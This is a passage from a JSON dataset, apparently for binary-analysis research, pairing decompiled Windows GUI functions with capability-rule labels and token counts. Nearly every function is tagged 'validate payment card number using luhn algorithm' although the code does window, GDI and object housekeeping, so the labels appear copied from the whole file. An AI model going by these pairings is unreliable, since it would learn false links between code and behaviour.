0x3c))();\n                var_1h._0_1_ = fcn.00448594();\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x44869e;\n                uStack48 = 0x448696;\n                uVar3 = fcn.00404640();\n                return uVar3;\n            }\n            puStack32 = 0x448618;\n            iVar1 = fcn.00447da8();\n            if (iVar1 != 0) goto code_r0x00448625;\n            var_1h._0_1_ = 1;\n            goto code_r0x004486bb;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x004486bb:\n    return var_1h;\n}\n",
        "token_count": 620
    },
    "00448724": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00448724(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0041fbc8();\n    uVar2 = *(*in_EAX + 0x38);\n    uVar1 = *(*in_EAX + 0x3c);\n    piVar3 = in_EAX;\n    fcn.004486c8(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1, in_EAX, uVar2, piVar3);\n    return;\n}\n",
        "token_count": 163
    },
    "00448a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00448a10(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY48;\n    uint uStackY44;\n    uchar *puStackY40;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY40 = 0x448a2f;\n    iVar1 = fcn.00420354(0);\n    uStackY44 = 0x448a70;\n    iStackY48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (iVar1 != 0) {\n        iVar1 = iVar1 + 0x14;\n    }\n    puStackY40 = &stack0xfffffffc;\n    sub.comctl32.dll_ImageList_Read();\n    fcn.00447b74();\n    *in_FS_OFFSET = iVar1;\n    uStackY44 = 0x448a77;\n    iStackY48 = 0x448a6f;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 239
    },
    "004495e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004495e8(code *arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(*(in_EAX + 0x30) + 8);\n    if (-1 < iVar1 + -1) {\n        iVar2 = 0;\n        do {\n            if (*(*(*(*(in_EAX + 0x30) + 4) + iVar2 * 4) + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "00449a28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00449a28(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0042015c();\n    *(in_EAX + 0x6a) = 1;\n    *(in_EAX + 0x80) = 0xffffffff;\n    *(in_EAX + 0x86) = 1;\n    *(in_EAX + 0x90) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 195
    },
    "0044c5e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044c5e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    *(*0x491634 + 0x1b4) = arg_8h;\n    iVar1 = sub.user32.dll_IsWindowUnicode(arg_8h);\n    if (iVar1 == 0) {\n        sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffffc, *(*0x491634 + 0x1c0));\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff0);\n        if ((uVar2 & 0x40000000) != 0) {\n            iVar1 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff4);\n            if (iVar1 == 0) {\n                sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffff4, arg_8h);\n            }\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowLongW(arg_8h, 0xfffffffc, *(*0x491634 + 0x1c0));\n        uVar2 = sub.user32.dll_GetWindowLongW(arg_8h, 0xfffffff0);\n        if ((uVar2 & 0x40000000) != 0) {\n            iVar1 = sub.user32.dll_GetWindowLongW(arg_8h, 0xfffffff4);\n            if (iVar1 == 0) {\n                sub.user32.dll_SetWindowLongW(arg_8h, 0xfffffff4, arg_8h);\n            }\n        }\n    }\n    sub.user32.dll_SetPropA(arg_8h, *0x497c6a, *0x491634);\n    sub.user32.dll_SetPropA(arg_8h, *0x497c68, *0x491634);\n    iVar1 = *0x491634;\n    *0x491634 = 0;\n    uVar3 = (**(iVar1 + 0x1c0))(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar3;\n}\n",
        "token_count": 507
    },
    "0044ca1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ca1c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar auStack16 [8];\n    \n    puVar3 = auStack16;\n    iVar1 = param_2;\n    sub.gdi32.dll_GetWindowOrgEx(param_2, auStack16);\n    iVar2 = param_2;\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1 + *(in_EAX + 0x40), puVar3 + *(in_EAX + 0x44), 0);\n    iVar1 = param_2;\n    fcn.00450f7c(param_2);\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1, iVar2, 0);\n    return;\n}\n",
        "token_count": 198
    },
    "0044cba8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044cba8(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = fcn.00402ef0();\n    *puVar2 = param_2;\n    uVar3 = fcn.0044cb7c(&stack0xfffffffc);\n    puVar2[1] = uVar3;\n    cVar1 = fcn.0044cb44();\n    if (cVar1 == '\\0') {\n        fcn.00419680();\n    }\n    else {\n        fcn.004197d8();\n        uVar3 = fcn.00457a28();\n        uVar3 = fcn.00457a28(uVar3);\n        sub.user32.dll_IsChild(uVar3);\n        fcn.00419854();\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "0044cf28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044cf28(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x40) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "0044e23c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0044e23c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h;\n    uint arg_ch;\n    \n    arg_ch = 0x44e250;\n    iVar1 = fcn.0044e208();\n    iVar3 = 0;\n    if (iVar1 != 0) {\n        arg_ch = 0;\n        arg_8h = 0;\n        fcn.0044f804();\n        iVar2 = fcn.00454860(arg_8h, arg_ch);\n        iVar3 = iVar1;\n        if (iVar2 != 0) {\n            iVar3 = iVar2;\n        }\n    }\n    return CONCAT44(arg_ch, iVar3);\n}\n",
        "token_count": 169
    },
    "0044e2d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044e2d0(void)\n\n{\n    sub.gdi32.dll_GetWindowOrgEx();\n    sub.gdi32.dll_SetWindowOrgEx();\n    return;\n}\n",
        "token_count": 40
    },
    "0044e300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044e300(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack24 = 0x44e310;\n    var_8h = fcn.00419b48();\n    uStack28 = 0x44e3b0;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (-1 < *(var_8h + 8) + -1) {\n        var_4h = 0;\n        puStack24 = &stack0xfffffffc;\n        var_ch = *(var_8h + 8);\n        do {\n            puStack36 = 0x44e342;\n            var_10h = fcn.004197d8();\n            puStack36 = 0x44e34d;\n            cVar1 = fcn.00424d58();\n            if (cVar1 != '\\0') {\n                uStack40 = 0x44e389;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.0044e53c();\n                fcn.00404f60();\n                fcn.00404f60();\n                return;\n            }\n            var_4h = var_4h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x44e3b7;\n    uStack28 = 0x44e3af;\n    fcn.00419bac();\n    return;\n}\n",
        "token_count": 441
    },
    "0044e5b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044e5b4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "0044ec24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044ec24(void)\n\n{\n    int32_t *arg_8h;\n    char extraout_DL;\n    \n    arg_8h = fcn.00404a0c();\n    fcn.00444674();\n    if ((arg_8h[0x25] == 0) || ((*(arg_8h[0x25] + 0x1c) & 8) != 0)) {\n        (**(*arg_8h + 0x6c))();\n    }\n    else {\n        fcn.0041fb4c();\n        fcn.00450f7c(arg_8h);\n        (**(*arg_8h + 0x6c))();\n        fcn.0044f5e4();\n        fcn.0040483c();\n        arg_8h[0x25] = 0;\n    }\n    fcn.00404640();\n    arg_8h[0x1b] = 0;\n    fcn.00404640();\n    fcn.00404640();\n    fcn.0040aaec();\n    fcn.00404640();\n    fcn.0041f884();\n    if ('\\0' < extraout_DL) {\n        fcn.004049b4();\n    }\n    return;\n}\n",
        "token_count": 282
    },
    "0044f5e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f5e4(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    *param_2 = *(in_EAX + 0x40);\n    param_2[1] = *(in_EAX + 0x44);\n    param_2[2] = *(in_EAX + 0x40) + *(in_EAX + 0x48);\n    param_2[3] = *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n    return;\n}\n",
        "token_count": 131
    },
    "0044f640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0044f640(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack12;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack12;\n}\n",
        "token_count": 48
    },
    "0044f658": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044f658(void)\n\n{\n    fcn.0044f684();\n    fcn.00418360();\n    fcn.0044fb50();\n    return;\n}\n",
        "token_count": 42
    },
    "0044f684": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0044f684(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack8;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack8;\n}\n",
        "token_count": 48
    },
    "0044f69c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044f69c(void)\n\n{\n    fcn.0044f640();\n    fcn.00418360();\n    fcn.0044fb50();\n    return;\n}\n",
        "token_count": 43
    },
    "0044f754": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f754(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 + iStack20;\n    param_1[1] = param_2[1] + iStack16;\n    return;\n}\n",
        "token_count": 105
    },
    "0044f804": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f804(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 - iStack20;\n    param_1[1] = param_2[1] - iStack16;\n    return;\n}\n",
        "token_count": 105
    },
    "0044fb50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044fb50(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iVar1 = *param_2;\n    iVar2 = param_2[1];\n    (**(*in_EAX + 0x44))(iVar1, iVar2);\n    (**(*in_EAX + 0x88))((in_EAX[0x13] - iStack16) + iVar2, (in_EAX[0x12] - iStack20) + iVar1);\n    return;\n}\n",
        "token_count": 154
    },
    "00450ca4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00450ca4(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *arg_8h;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uchar auStack28 [16];\n    \n    uVar3 = *param_2;\n    uVar4 = param_2[1];\n    uVar5 = param_2[2];\n    uVar6 = param_2[3];\n    if (*(in_EAX + 0x94) != 0) {\n        cVar1 = fcn.0040483c(uVar3, uVar4, uVar5, uVar6);\n        if (cVar1 == '\\0') {\n            cVar1 = '\\0';\n            goto code_r0x00450cd8;\n        }\n    }\n    cVar1 = '\\x01';\ncode_r0x00450cd8:\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.004520cc();\n        if (iVar2 == 0) {\n            fcn.0040483c(uVar3, uVar4, uVar5, uVar6);\n        }\n        else {\n            uVar3 = fcn.0044f684();\n            arg_8h = auStack28;\n            fcn.0044f640();\n            fcn.00418388(arg_8h, uVar3);\n            fcn.0040483c();\n        }\n    }\n    return cVar1;\n}\n",
        "token_count": 354
    },
    "00450e48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450e48(uint param_1, int32_t param_2)\n\n{\n    uint uStack16;\n    \n    sub.user32.dll_GetCursorPos();\n    fcn.0044f804();\n    *param_2 = param_2;\n    *(param_2 + 4) = uStack16;\n    return;\n}\n",
        "token_count": 77
    },
    "00450f7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00450f7c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        (**(in_EAX + 0x38))();\n    }\n    return 0;\n}\n",
        "token_count": 86
    },
    "00451624": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451624(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = 0x4513c4;\n    fcn.004513d0(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar4);\n    uVar3 = 0x452918;\n    uVar4 = 0x4528b0;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451404(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x4528e8;\n    uVar4 = 0x452890;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451404(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x4528c0;\n    uVar4 = 0x4528d8;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451404(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x452900;\n    uVar4 = 0x4528a0;\n    iVar1 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451404(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, in_EAX, uVar3, iVar1);\n    return;\n}\n",
        "token_count": 521
    },
    "00451878": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451878(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        if ((*(in_EAX + 0x48) < 0x8001) && (*(in_EAX + 0x4c) < 0x8001)) {\n            fcn.0043b010(*(in_EDX + 10), *(in_EDX + 8));\n            fcn.0040483c();\n        }\n        else {\n            fcn.00450e48();\n            fcn.0043b010(var_4h, var_8h);\n            fcn.0040483c();\n        }\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "004520cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004520cc(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = (**(*in_EAX + 0x58))(*param_2, param_2[1], param_2[2], param_2[3]);\n    if (iVar1 != 0) {\n        iVar1 = (**(*in_EAX + 0x58))();\n        iVar2 = fcn.00404518();\n        if (iVar1 != iVar2) {\n            iVar1 = (**(*in_EAX + 0x58))();\n            uVar3 = (**(iVar1 + 0x2c))();\n            fcn.0044f388();\n            fcn.0044f354();\n            fcn.0044f658();\n            fcn.0044f69c();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 226
    },
    "004524cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004524cc(uint param_1, int32_t param_2)\n\n{\n    double *in_EAX;\n    double *pdVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if (0 < param_2) {\n        iVar3 = 1;\n        pdVar1 = in_EAX;\n        do {\n            pdVar1 = pdVar1 + 1;\n            if (*pdVar1 < in_EAX[iVar2]) {\n                iVar2 = iVar3;\n            }\n            iVar3 = iVar3 + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 173
    },
    "00452964": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00452964(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    code **in_FS_OFFSET;\n    code *pcVar3;\n    code *pcStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        puStack40 = 0x45297d;\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    uStack44 = 0x452a7e;\n    pcStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &fcn.00452964::var_1h + 1;\n    var_1h._0_1_ = param_2;\n    fcn.0044eb2c();\n    pcVar3 = fcn.0045471c;\n    uVar1 = fcn.004208f8(fcn.0045471c, in_EAX);\n    *(in_EAX + 0x1c0) = uVar1;\n    uVar1 = fcn.00424684();\n    *(in_EAX + 0x1a4) = uVar1;\n    fcn.0042482c();\n    *(in_EAX + 0x1dd) = 1;\n    *(in_EAX + 0x1d4) = 0xffffffff;\n    *(in_EAX + 0x1b8) = 3;\n    if (*(*0x492b04 + 4) == 0x11) {\n        fcn.0040546c();\n    }\n    else {\n        fcn.00443610();\n        fcn.004054c0();\n    }\n    *(in_EAX + 0x1db) = 0;\n    *(in_EAX + 0x192) = *0x452aa4;\n    *(in_EAX + 0x193) = 2;\n    *(in_EAX + 0x194) = 1;\n    *(in_EAX + 0x198) = 1;\n    *(in_EAX + 0x158) = 1;\n    iVar2 = fcn.0045d0dc();\n    *(in_EAX + 0x1a0) = iVar2;\n    *(iVar2 + 0x1c) = in_EAX;\n    *(iVar2 + 0x18) = 0x458db4;\n    *in_FS_OFFSET = pcVar3;\n    pcStack48 = 0x452a85;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 642
    },
    "00452cd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452cd4(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    \n    *param_2 = *param_2 + *(*(in_EAX + 0x1a0) + 8);\n    param_2[1] = param_2[1] + *(*(in_EAX + 0x1a0) + 0xc);\n    param_2[2] = param_2[2] - *(*(in_EAX + 0x1a0) + 0x10);\n    param_2[3] = param_2[3] - *(*(in_EAX + 0x1a0) + 0x14);\n    return;\n}\n",
        "token_count": 167
    },
    "004530e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004530e4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar1 = fcn.00457d34();\n    if (cVar1 == '\\0') {\n        fcn.00418360();\n    }\n    else {\n        (**(*in_EAX + 0x44))();\n        *param_2 = var_8h;\n        param_2[1] = var_4h;\n    }\n    *param_2 = *param_2 - (*(in_EAX[0x68] + 8) + *(in_EAX[0x68] + 0x10));\n    param_2[1] = param_2[1] - (*(in_EAX[0x68] + 0xc) + *(in_EAX[0x68] + 0x14));\n    return;\n}\n",
        "token_count": 231
    },
    "00453274": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453274(int32_t arg_8h)\n\n{\n    uint *in_ECX;\n    uint in_EDX;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint *arg_10h;\n    uint var_18h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    arg_10h = &var_10h;\n    arg_ch = *(arg_8h + -8);\n    arg_8h_00 = 0;\n    fcn.004530e4();\n    fcn.00452d04(arg_8h_00, arg_ch, arg_10h, in_EDX);\n    return;\n}\n",
        "token_count": 207
    },
    "00453664": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00453664(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00404610();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    fcn.0044f640();\n    iVar2 = fcn.00453b18();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00453adc();\n            if (*(iVar3 + 4) == *(in_EAX + 4)) {\n                fcn.00453adc();\n                fcn.00419680();\n                fcn.0044f354();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar1 = *(iVar1 + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.004197d8();\n            fcn.00450f7c(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 327
    },
    "00453948": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453948(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    fcn.0040483c();\n    uVar3 = 1;\n    piVar4 = param_2;\n    fcn.00450f7c(1);\n    uVar2 = 1;\n    fcn.00450f7c(1);\n    fcn.004538b4(uVar2, uVar3, piVar4);\n    if ((*(param_2 + 7) & 2) == 0) {\n        fcn.00450f7c(0);\n        fcn.00450f7c(0);\n        fcn.00450f7c(0);\n        fcn.00450f7c(0);\n        cVar1 = fcn.004047cc();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.00457d34();\n            if (cVar1 != '\\0') {\n                (**(*param_2 + 0x80))();\n            }\n        }\n        else {\n            fcn.00450f7c(0);\n            fcn.004545e8();\n        }\n        fcn.004535a0();\n    }\n    fcn.00450f7c(1);\n    return;\n}\n",
        "token_count": 315
    },
    "00453a3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453a3c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    \n    uVar2 = 0;\n    piVar3 = param_2;\n    fcn.00450f7c(0);\n    cVar1 = fcn.004047cc(uVar2, piVar3);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00457d34();\n        if (cVar1 != '\\0') {\n            fcn.0045011c();\n        }\n    }\n    else {\n        fcn.00453894();\n        (**(*param_2 + 0xb0))();\n    }\n    fcn.00453900();\n    fcn.00450f7c(0);\n    fcn.00450f7c(0);\n    fcn.0045365c();\n    return;\n}\n",
        "token_count": 215
    },
    "00453b18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
